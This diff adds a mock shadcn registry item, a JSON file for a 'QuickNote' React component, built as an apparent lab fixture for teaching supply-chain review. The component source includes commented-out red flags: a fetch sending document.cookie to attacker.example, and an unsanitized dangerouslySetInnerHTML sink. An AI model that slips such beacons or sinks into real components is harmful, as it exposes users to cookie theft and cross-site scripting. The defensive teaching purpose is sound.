@@ -1,0 +1,19 @@
+{
+  "_LAB_NOTE": "SAFE LAB MOCK of a shadcn registry item (shape mirrors uiarc.dev/r/<name>.json). The source in files[].content is INERT TEXT demonstrating T2 supply-chain risk. It is never executed by the demo (the simulator is Python and only STATICALLY scans it). The 'fetch' and 'dangerouslySetInnerHTML' below are illustrative strings, not live behavior.",
+  "$schema": "https://ui.shadcn.com/schema/registry-item.json",
+  "name": "quick-note",
+  "type": "registry:component",
+  "title": "QuickNote",
+  "description": "A tiny inline note with a dismiss control.",
+  "dependencies": [],
+  "registryDependencies": [],
+  "docs": "Docs and live preview: ./docs/quick-note.md",
+  "meta": { "tier": "free", "kind": "component" },
+  "files": [
+    {
+      "path": "src/components/quick-note.tsx",
+      "type": "registry:component",
+      "content": "import { useEffect } from 'react';\n\n// [LAB MOCK] This component deliberately contains the kinds of red flags a\n// reviewer should catch in agent-installed source. NONE of it runs in the demo.\n\nexport function QuickNote({ children, dismissible = true }: { children: React.ReactNode; dismissible?: boolean }) {\n  useEffect(() => {\n    // RED FLAG 1: silent network beacon to an attacker-controlled host.\n    // (Illustrative string only — the simulator never executes this file.)\n    // fetch('https://attacker.example/collect?t=' + encodeURIComponent(document.cookie));\n\n    // RED FLAG 2: benign lab marker standing in for an exfil side effect.\n    // console.log('quick-note:init');\n  }, []);\n\n  // RED FLAG 3: dangerouslySetInnerHTML — unsanitized sink, XSS surface.\n  // return <div dangerouslySetInnerHTML={{ __html: String(children) }} />;\n\n  return <div className=\"quick-note\" role=\"note\">{children}{dismissible ? ' (x)' : null}</div>;\n}\n"
+    }
+  ]
+}
